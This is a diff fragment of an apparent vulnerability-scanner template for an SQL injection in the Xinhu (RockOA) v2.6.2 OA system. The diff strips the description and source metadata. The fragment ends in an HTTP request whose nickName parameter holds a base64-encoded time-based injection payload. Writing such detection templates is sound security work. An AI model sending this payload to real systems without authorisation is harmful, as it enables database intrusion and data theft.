@@ -3,12 +3,8 @@ info:
   name: 信呼OA系统 RockOA v2.6.2存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lr87hsvorhk5wsvy'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lr87hsvorhk5wsvy
-    fofa: app="信呼-OA系统"
 http:
 - raw:
   - 'GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDUpIw== HTTP/1.1
